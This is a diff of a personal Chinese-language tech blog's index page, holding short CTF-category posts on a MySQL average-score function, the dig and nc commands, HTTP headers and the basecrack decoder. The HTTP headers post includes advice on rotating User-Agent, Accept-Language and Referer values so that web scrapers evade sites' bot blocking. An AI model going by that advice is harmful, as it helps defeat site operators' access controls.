+returns float
+begin
+	return(select round(avg(score),2))
+    from sc where sno&#x3D;f_sno;
+end $$
+delimiter ;
+
+delimiter $$
+create function get_avgscore(f_sno char(2))
+returns float
+begin
+	return(select round(avg(score),2) from sc where sno &#x3D; f_sno);
+end $$
+delimiter ;
+
+drop function if exists get_avgscore;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/dig%E5%91%BD%E4%BB%A4%E6%9F%A5%E7%9C%8BDNS%E8%AE%B0%E5%BD%95/">
+                linux中用dig命令查询DNS记录
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2022-05-24</span>
+            
+            
+                <a href="http://dezhoutorizhao.github.io/dig%E5%91%BD%E4%BB%A4%E6%9F%A5%E7%9C%8BDNS%E8%AE%B0%E5%BD%95/#disqus_thread" class="comments article-comment-link">留言</a>
+            
+            
+                <span class="category">
+                    <a href="/categories/CTF/">CTF</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <h1 id="dig命令"><a href="#dig命令" class="headerlink" title="dig命令"></a>dig命令</h1><p><a target="_blank" rel="noopener" href="https://www.sysgeek.cn/linux-dig/">dig命令</a></p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/HTTP%20headers/">
+                HTTP Headers
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2022-05-23</span>
+            
+            
+                <a href="http://dezhoutorizhao.github.io/HTTP%20headers/#disqus_thread" class="comments article-comment-link">留言</a>
+            
+            
+                <span class="category">
+                    <a href="/categories/CTF/">CTF</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <h1 id="最常见的HTTP-Headers"><a href="#最常见的HTTP-Headers" class="headerlink" title="最常见的HTTP Headers"></a>最常见的HTTP Headers</h1><ol>
+<li>使用和优化HTTP Headers。这种方法会大大减少您的网络爬虫被各种数据源封锁的可能性，并确保检索到高质量的数据。</li>
+<li>Header使客户端和服务器都能够在请求或响应中传输更多详细信息。<br><img src="https://s2.loli.net/2022/05/23/lvfEKmxSVF3QaNd.png"></li>
+</ol>
+<h2 id="HTTP-Header-User-Agent"><a href="#HTTP-Header-User-Agent" class="headerlink" title="HTTP Header User-Agent"></a>HTTP Header User-Agent</h2><ol>
+<li>User-Agent Header传递的信息包括应用类型，操作系统，软件和版本信息，并允许数据目标来决定使用何种类型的HTML布局来响应，手机、平板电脑或PC均可显示不同的HTML布局。</li>
+<li>网络服务器经常会验证User-Agent Header，这是网站服务器的第一重保障，这个步骤可以让数据源识别出可疑请求。例如，网络抓取时，大量请求传输到网络服务器，如果User-Agent Header相同，那么服务器端就会判定是爬虫行为。因此，有经验的网页抓取者会把User-Agent Header修改成不同的字符串，从而让服务器识别成是多个自然用户在发出请求。</li>
+<li>因此，当涉及到User-Agent Header时，需要经常更改此Header的信息，这样就不容易因为这个Header而被封锁。</li>
+</ol>
+<h2 id="HTTP-Header-Accept-Language"><a href="#HTTP-Header-Accept-Language" class="headerlink" title="HTTP Header Accept-Language"></a>HTTP Header Accept-Language</h2><ol>
+<li>Accept-Language Header向网络服务器传递的信息包含客户端有哪些语言，以及当网络服务器发回响应时首选哪种特定语言。</li>
+<li>当网络服务器无法识别首选语言时，通常会使用特定Header。</li>
+<li>也就是说，Accept-Language Header的关键是相关性。必须确保设置的语言符合数据目标域和客户端的IP位置。原因很简单，如果来自同一个客户端的请求内置有多种语言，网络服务器就会怀疑是爬虫行为，因此，网站就可能会阻止网络抓取过程。</li>
+</ol>
+<h2 id="HTTP-Header-Accept-Encoding"><a href="#HTTP-Header-Accept-Encoding" class="headerlink" title="HTTP Header Accept-Encoding"></a>HTTP Header Accept-Encoding</h2><ol>
+<li>Accept-Encoding Header通知网络服务器在处理请求时使用哪种压缩算法。换句话说，当从网络服务器发送到客户端时，如果服务器可以处理，就会确认可以压缩的信息。</li>
+<li>使用该Header优化后它可以节省流量，从流量负载的角度来看，这对客户端和网络服务器来说都比较好。客户端仍然会获得所需的信息，只是被压缩了。数据压缩后，网络服务器的流量小了，资源就节约下来了。</li>
+</ol>
+<h2 id="HTTP-Header-Accept"><a href="#HTTP-Header-Accept" class="headerlink" title="HTTP Header Accept"></a>HTTP Header Accept</h2><ol>
+<li>Accept Header属于内容协商类别，其目的是通知网络服务器可以向客户端返回什么类型的数据格式。</li>
+<li>听起来很简单，但是网络抓取最常犯的一个错误就是忽略或忘记根据网络服务器接受的格式来配置Header。如果Accept Header配置得当，就会让客户端和服务器之间的通信更加像真实用户行为，从而减少网络爬虫被封锁的可能性。</li>
+</ol>
+<h2 id="HTTP-Header-Referer"><a href="#HTTP-Header-Referer" class="headerlink" title="HTTP Header Referer"></a>HTTP Header Referer</h2><ol>
+<li>在将请求发送到网络服务器之前，Referer Header会提供请求前用户所在的网页地址。</li>
+<li>在网站试图阻止抓取过程时，Referer Header其实影响不大。一个随机的真实用户很可能上网时间间隔数小时。因此，如果您想网络抓取工具的流量看上去更加自然，只需在开始网络抓取会话之前指定一个随机网站。</li>
+</ol>
+<h1 id="HTTP-headers-数据类型"><a href="#HTTP-headers-数据类型" class="headerlink" title="HTTP headers 数据类型"></a>HTTP headers 数据类型</h1><ol>
+<li>Accept：浏览器可接受的MIME类型。</li>
+<li>Accept-Charset：浏览器可接受的字符集。</li>
+<li>Accept-Encoding：浏览器能够进行解码的数据编码方式，比如gzip。Servlet能够向支持gzip的浏览器返回经gzip编码的HTML页面。许多情形下这可以减少5到10倍的下载时间。</li>
+<li>Accept-Language：浏览器所希望的语言种类，当服务器能够提供一种以上的语言版本时要用到。</li>
+<li>Authorization：授权信息，通常出现在对服务器发送的WWW-Authenticate头的应答中。</li>
+<li>Connection：表示是否需要持久连接。如果Servlet看到这里的值为“Keep-Alive”，或者看到请求使用的是HTTP 1.1（HTTP 1.1默认进行持久连接），它就可以利用持久连接的优点，当页面包含多个元素时（例如Applet，图片），显著地减少下载所需要的时间。要实现这一点，Servlet需要在应答中发送一个Content-Length头，最简单的实现方法是：先把内容写入ByteArrayOutputStream，然后在正式写出内容之前计算它的大小。</li>
+<li>Content-Length：表示请求消息正文的长度。</li>
+<li>Cookie：这是最重要的请求头信息之一</li>
+<li>From：请求发送者的email地址，由一些特殊的Web客户程序使用，浏览器不会用到它。</li>
+<li>Host：初始URL中的主机和端口。</li>
+<li>If-Modified-Since：只有当所请求的内容在指定的日期之后又经过修改才返回它，否则返回304“Not Modified”应答。</li>
+<li>Pragma：指定“no-cache”值表示服务器必须返回一个刷新后的文档，即使它是代理服务器而且已经有了页面的本地拷贝。</li>
+<li>Referer：包含一个URL，用户从该URL代表的页面出发访问当前请求的页面。</li>
+<li>User-Agent：浏览器类型，如果Servlet返回的内容与浏览器类型有关则该值非常有用。</li>
+<li>UA-Pixels，UA-Color，UA-OS，UA-CPU：由某些版本的IE浏览器所发送的非标准的请求头，表示屏幕大小、颜色深度、操作系统和CPU类型。</li>
+<li>HTTP应答头概述（HttpServletResponse）</li>
+<li>Web服务器的HTTP应答一般由以下几项构成：一个状态行，一个或多个应答头，一个空行，内容文档。设置HTTP应答头往往和设置状态行中的状态代码结合起来。例如，有好几个表示“文档位置已经改变”的状态代码都伴随着一个Location头，而401（Unauthorized）状态代码则必须伴随一个WWW-Authenticate头。<br>然而，即使在没有设置特殊含义的状态代码时，指定应答头也是很有用的。应答头可以用来完成：设置Cookie，指定修改日期，指示浏览器按照指定的间隔刷新页面，声明文档的长度以便利用持久HTTP连接，……等等许多其他任务。<br>设置应答头最常用的方法是HttpServletResponse的setHeader，该方法有两个参数，分别表示应答头的名字和值。和设置状态代码相似，设置应答头应该在发送任何文档内容之前进行。</li>
+<li>HttpServletResponse还提供了许多设置</li>
+<li>setContentType：设置Content-Type头。大多数Servlet都要用到这个方法。</li>
+<li>setContentLength：设置Content-Length头。对于支持持久HTTP连接的浏览器来说，这个函数是很有用的。</li>
+<li>addCookie：设置一个Cookie（Servlet API中没有setCookie方法，因为应答往往包含多个Set-Cookie头）。<br>另外，如上节介绍，sendRedirect方法设置状态代码302时也会设置Location头。</li>
+<li>HTTP应答头 说明</li>
+<li>Allow 服务器支持哪些请求方法（如GET、POST等）。</li>
+<li>Content-Encoding 文档的编码（Encode）方法。只有在解码之后才可以得到Content-Type头指定的内容类型。利用gzip压缩文档能够显著地减少HTML文档的下载时间。Java的GZIPOutputStream可以很方便地进行gzip压缩，但只有Unix上的Netscape和Windows上的IE 4、IE 5才支持它。因此，Servlet应该通过查看Accept-Encoding头（即request.getHeader(“Accept-Encoding”)）检查浏览器是否支持gzip，为支持gzip的浏览器返回经gzip压缩的HTML页面，为其他浏览器返回普通页面。</li>
+<li>Content-Length 表示内容长度。只有当浏览器使用持久HTTP连接时才需要这个数据。如果你想要利用持久连接的优势，可以把输出文档写入ByteArrayOutputStram，完成后查看其大小，然后把该值放入Content-Length头，最后通过byteArrayStream.writeTo(response.getOutputStream()发送内容。</li>
+<li>Content-Type 表示后面的文档属于什么MIME类型。Servlet默认为text/plain，但通常需要显式地指定为text/html。由于经常要设置Content-Type，因此HttpServletResponse提供了一个专用的方法setContentType。</li>
+<li>Date 当前的GMT时间。你可以用setDateHeader来设置这个头以避免转换时间格式的麻烦。</li>
+<li>Expires 应该在什么时候认为文档已经过期，从而不再缓存它？</li>
+<li>Last-Modified 文档的最后改动时间。客户可以通过If-Modified-Since请求头提供一个日期，该请求将被视为一个条件GET，只有改动时间迟于指定时间的文档才会返回，否则返回一个304（Not Modified）状态。Last-Modified也可用setDateHeader方法来设置。</li>
+<li>Location 表示客户应当到哪里去提取文档。Location通常不是直接设置的，而是通过HttpServletResponse的sendRedirect方法，该方法同时设置状态代码为302。</li>
+<li>Refresh 表示浏览器应该在多少时间之后刷新文档，以秒计。除了刷新当前文档之外，你还可以通过setHeader(“Refresh”, “5; URL=<a target="_blank" rel="noopener" href="http://host/path&quot;)%E8%AE%A9%E6%B5%8F%E8%A7%88%E5%99%A8%E8%AF%BB%E5%8F%96%E6%8C%87%E5%AE%9A%E7%9A%84%E9%A1%B5%E9%9D%A2%E3%80%82%E6%B3%A8%E6%84%8F%E8%BF%99%E7%A7%8D%E5%8A%9F%E8%83%BD%E9%80%9A%E5%B8%B8%E6%98%AF%E9%80%9A%E8%BF%87%E8%AE%BE%E7%BD%AEHTML%E9%A1%B5%E9%9D%A2HEAD%E5%8C%BA%E7%9A%84">http://host/path&quot;)让浏览器读取指定的页面。注意这种功能通常是通过设置HTML页面HEAD区的</a><META HTTP-EQUIV="Refresh" CONTENT="5;URL=http://host/path">实现，这是因为，自动刷新或重定向对于那些不能使用CGI或Servlet的HTML编写者十分重要。但是，对于Servlet来说，直接设置Refresh头更加方便。注意Refresh的意义是“N秒之后刷新本页面或访问指定页面”，而不是“每隔N秒刷新本页面或访问指定页面”。因此，连续刷新要求每次都发送一个Refresh头，而发送204状态代码则可以阻止浏览器继续刷新，不管是使用Refresh头还是&lt;META HTTP-EQUIV=”Refresh” …&gt;。注意Refresh头不属于HTTP 1.1正式规范的一部分，而是一个扩展，但Netscape和IE都支持它。</li>
+<li>Server 服务器名字。Servlet一般不设置这个值，而是由Web服务器自己设置。</li>
+<li>Set-Cookie 设置和页面关联的Cookie。Servlet不应使用response.setHeader(“Set-Cookie”, …)，而是应使用HttpServletResponse提供的专用方法addCookie。参见下文有关Cookie设置的讨论。</li>
+<li>WWW-Authenticate 客户应该在Authorization头中提供什么类型的授权信息？在包含401（Unauthorized）状态行的应答中这个头是必需的。例如，response.setHeader(“WWW-Authenticate”, “BASIC realm=&quot;executives&quot;“)。注意Servlet一般不进行这方面的处理，而是让Web服务器的专门机制来控制受密码保护页面的访问（例如.htaccess）。</li>
+</ol>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/nc%E5%91%BD%E4%BB%A4/">
+                nc命令
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2022-05-21</span>
+            
+            
+                <a href="http://dezhoutorizhao.github.io/nc%E5%91%BD%E4%BB%A4/#disqus_thread" class="comments article-comment-link">留言</a>
+            
+            
+                <span class="category">
+                    <a href="/categories/CTF/">CTF</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <h1 id="nc命令"><a href="#nc命令" class="headerlink" title="nc命令"></a>nc命令</h1><h2 id="netcat的简写"><a href="#netcat的简写" class="headerlink" title="netcat的简写"></a>netcat的简写</h2><ol>
+<li>nc是软连接到ncat<h2 id="主要作用："><a href="#主要作用：" class="headerlink" title="主要作用："></a>主要作用：</h2></li>
+<li>实现任意TCP/UDP端口侦听，nc可以作为server以TCP或UDP方式侦听指定端口</li>
+<li>端口的扫描（其它的博客推荐nmap，确实是）</li>
+<li>机器之间传输文件</li>
+<li>机器之间网络测速</li>
+</ol>
+<h1 id="使用实例"><a href="#使用实例" class="headerlink" title="使用实例"></a>使用实例</h1><ol>
+<li>验证服务器端口是否通<br><img src="https://img-blog.csdnimg.cn/20210615163556344.png"></li>
+<li>拷贝文件,首先在文件接受终端test2机器上激活nc监听，然后再文件发送终端test1机器上发送文件，test2上检查文件是否已经接受<br><img src=""></li>
+</ol>
+<h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><ol>
+<li>ncat [options] [hostname] [port]<br><img src="https://s2.loli.net/2022/05/21/ahBkJyTRbjZfHFm.png"><br><img src="https://s2.loli.net/2022/05/21/ZeqnEW7c6bFDTjI.png"><br><img src="https://s2.loli.net/2022/05/21/g6Qu3w74rNoRevt.png"></li>
+</ol>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/basecrack/">
+                basecrack工具使用
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2022-05-21</span>
+            
+            
+                <a href="http://dezhoutorizhao.github.io/basecrack/#disqus_thread" class="comments article-comment-link">留言</a>
+            
+            
+                <span class="category">
+                    <a href="/categories/CTF/">CTF</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <h1 id="basecrack工具"><a href="#basecrack工具" class="headerlink" title="basecrack工具"></a>basecrack工具</h1><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><pre class="line-numbers language-none"><code class="language-none">$ git clone https:&#x2F;&#x2F;github.com&#x2F;mufeedvh&#x2F;basecrack.git
 
 $ cd basecrack
 
 $ pip install -r requirements.txt
 
-$ python basecrack.py -h
-使用对来自用户输入的单个Base编码数据进行解码：
+$ python basecrack.py -h<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><pre class="line-numbers language-none"><code class="language-none">对来自用户输入的单个Base编码数据进行解码：
 
 python basecrack.py
 对通过参数（-b&#x2F;--base）传递的单个Base编码数据进行解码：
@@ -296,13 +2197,237 @@ python basecrack.py -f file.txt
 python basecrack.py --magic
 使用解码的Base数据生成字典文件并输出（-o&#x2F;--output）：
 
-python basecrack.py -f fil ...</div></div></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/page/6/#content-inner"><i class="fas fa-chevron-left fa-fw"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/#content-inner">6</a><span class="page-number current">7</span><a class="page-number" href="/page/8/#content-inner">8</a><span class="space">&hellip;</span><a class="page-number" href="/page/12/#content-inner">12</a><a class="extend next" rel="next" href="/page/8/#content-inner"><i class="fas fa-chevron-right fa-fw"></i></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/QQ图片20240111033823.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">h3110w0r1d</div><div class="author-info__description">CTF web手、Golang后端开发工程师 研究多线程高并发、渗透测试      Web安全</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">106</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">50</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">70</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/dezhoutorizhao?tab=repositories"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">h3110w0r1d师傅又发布了新博客了，快去看看吧</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023%E5%A4%8D%E7%9B%98/" title="2023复盘">2023复盘</a><time datetime="2024-01-10T16:41:46.332Z" title="发表于 2024-01-11 00:41:46">2024-01-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/" title="侧信道攻击">侧信道攻击</a><time datetime="2023-09-26T09:03:09.760Z" title="发表于 2023-09-26 17:03:09">2023-09-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B_%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/" title="蓝帽杯半决赛wp_电子取证部分">蓝帽杯半决赛wp_电子取证部分</a><time datetime="2023-09-16T13:26:55.732Z" title="发表于 2023-09-16 21:26:55">2023-09-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B_web/" title="蓝帽杯半决赛wp_web部分">蓝帽杯半决赛wp_web部分</a><time datetime="2023-09-16T13:18:03.466Z" title="发表于 2023-09-16 21:18:03">2023-09-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" title="数据结构">数据结构</a><time datetime="2023-08-30T08:37:08.678Z" title="发表于 2023-08-30 16:37:08">2023-08-30</time></div></div></div></div><div class="card-widget card-categories"><div class="item-headline">
-            <i class="fas fa-folder-open"></i>
-            <span>分类</span>
-            <a class="card-more-btn" href="/categories/" title="查看更多">
-    <i class="fas fa-angle-right"></i></a>
+python basecrack.py -f file.txt -o output-wordlist.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+        </div>
+    
+
+</div>
+            
+        </section>
+    </div>
+</div>
+
+
+
+    <div class="row">
+        <div class="col-sm-12">
+            <div class="wrap-pagination">
+                <a class="" href="/page/6/">
+                    <i class="fa fa-chevron-left" aria-hidden="true"></i>
+                </a>
+                <a class="" href="/page/8/">
+                    <i class="fa fa-chevron-right" aria-hidden="true"></i>
+                </a>
             </div>
-            <ul class="card-category-list" id="aside-cat-list">
-            <li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CSS/"><span class="card-category-list-name">CSS</span><span class="card-category-list-count">1</span></a><ul class="card-category-list child"><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CSS/ing/"><span class="card-category-list-name">ing</span><span class="card-category-list-count">1</span></a></li></ul></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CTF/"><span class="card-category-list-name">CTF</span><span class="card-category-list-count">40</span></a><ul class="card-category-list child"><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CTF/ing/"><span class="card-category-list-name">ing</span><span class="card-category-list-count">2</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CTF/linux/"><span class="card-category-list-name">linux</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CTF/ping/"><span class="card-category-list-name">ping</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CTF/sql%E6%B3%A8%E5%85%A5/"><span class="card-category-list-name">sql注入</span><span class="card-category-list-count">2</span></a><ul class="card-category-list child"><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CTF/sql%E6%B3%A8%E5%85%A5/%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5/"><span class="card-category-list-name">手动注入</span><span class="card-category-list-count">1</span></a></li></ul></li></ul></li>
-            </ul></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/mysql/" style="font-size: 1.1em; color: #999">mysql</a> <a href="/tags/awd/" style="font-size: 1.1em; color: #999">awd</a> <a href="/tags/%E5%88%86%E7%9B%98/" style="font-size: 1.1em; color: #999">分盘</a> <a href="/tags/%E7%BD%91%E7%AB%99%E5%A4%87%E4%BB%BD%E6%BC%8F%E6%B4%9E/" style="font-size: 1.1em; color: #999">网站备份漏洞</a> <a href="/tags/Java/" style="font-size: 1.16em; color: #999b9e">Java</a> <a href="/tags/Javaweb/" style="font-size: 1.1em; color: #999">Javaweb</a> <a href="/tags/acm%E7%AE%97%E6%B3%95/" style="font-size: 1.21em; color: #999ea4">acm算法</a> <a href="/tags/linux/" style="font-size: 1.39em; color: #99a4b4">linux</a> <a href="/tags/HTML/" style="font-size: 1.16em; color: #999b9e">HTML</a> <a href="/tags/hive/" style="font-size: 1.1em; color: #999">hive</a> <a href="/tags/hadoop/" style="font-size: 1.21em; color: #999ea4">hadoop</a> <a href="/tags/ping/" style="font-size: 1.1em; color: #999">ping</a> <a href="/tags/ing/" style="font-size: 1.44em; color: #99a7ba">ing</a> <a href="/tags/%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95%E6%9C%8D%E5%8A%A1%E5%99%A8/" style="font-size: 1.1em; color: #999">远程登录服务器</a> <a href="/tags/CTF/" style="font-size: 1.5em; color: #99a9bf">CTF</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 1.33em; color: #99a2af">渗透</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96/" style="font-size: 1.1em; color: #999">数据可视化</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%BF%AE%E5%A4%8D/" style="font-size: 1.21em; color: #999ea4">文件修复</a> <a href="/tags/goweb/" style="font-size: 1.1em; color: #999">goweb</a> <a href="/tags/%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5/" style="font-size: 1.1em; color: #999">手动注入</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" style="font-size: 1.1em; color: #999">数据结构</a> <a href="/tags/%E5%AE%9E%E6%88%98/" style="font-size: 1.1em; color: #999">实战</a> <a href="/tags/go/" style="font-size: 1.27em; color: #99a0a9">go</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 1.39em; color: #99a4b4">数据库</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90/" style="font-size: 1.1em; color: #999">脚本小子</a> <a href="/tags/ssh/" style="font-size: 1.1em; color: #999">ssh</a> <a href="/tags/web/" style="font-size: 1.27em; color: #99a0a9">web</a> <a href="/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/" style="font-size: 1.1em; color: #999">机器学习</a> <a href="/tags/Hadoop/" style="font-size: 1.1em; color: #999">Hadoop</a> <a href="/tags/%E7%BC%96%E7%A0%81/" style="font-size: 1.1em; color: #999">编码</a> <a href="/tags/%E5%AF%86%E9%92%A5/" style="font-size: 1.1em; color: #999">密钥</a> <a href="/tags/%E7%B3%BB%E7%BB%9F/" style="font-size: 1.1em; color: #999">系统</a> <a href="/tags/winhex/" style="font-size: 1.1em; color: #999">winhex</a> <a href="/tags/PHP/" style="font-size: 1.27em; color: #99a0a9">PHP</a> <a href="/tags/phpstudy/" style="font-size: 1.1em; color: #999">phpstudy</a> <a href="/tags/%E5%8D%9A%E5%AE%A2/" style="font-size: 1.1em; color: #999">博客</a> <a href="/tags/IP/" style="font-size: 1.1em; color: #999">IP</a> <a href="/tags/%E5%AE%9A%E4%B9%89/" style="font-size: 1.21em; color: #999ea4">定义</a> <a href="/tags/CSS/" style="font-size: 1.1em; color: #999">CSS</a> <a href="/tags/%E7%A3%81%E7%9B%98%E7%AE%A1%E7%90%86/" style="font-size: 1.1em; color: #999">磁盘管理</a></div></div><div class="card-widget card-archives"><div class="item-headline"><i class="fas fa-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
-    <i class="fas fa-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/09/"><span class="card-archive-list-date">九月 2023</span><span class="card-archive-list-count">3</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/08/"><span class="card-archive-list-date">八月 2023</span><span class="card-archive-list-count">3</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/07/"><span class="card-archive-list-date">七月 2023</span><span class="card-archive-list-count">3</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/06/"><span class="card-archive-list-date">六月 2023</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/04/"><span class="card-archive-list-date">四月 2023</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/03/"><span class="card-archive-list-date">三月 2023</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/12/"><span class="card-archive-list-date">十二月 2022</span><span class="card-archive-list-count">1</span></a></li></ul></div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站资讯</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">106</div></div><div class="webinfo-item"><div class="item-name">本站访客数 :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站总访问量 :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2024-01-15T05:48:16.933Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div><div class="card-widget user-map" id="user-map"><div class="item-headline"><i class="fas fa-heartbeat"></i><span>訪客地圖</span></div><div class="item-content"></div></div></div></div></main><footer id="footer" style="background: transparent"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By h3110w0r1d</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas 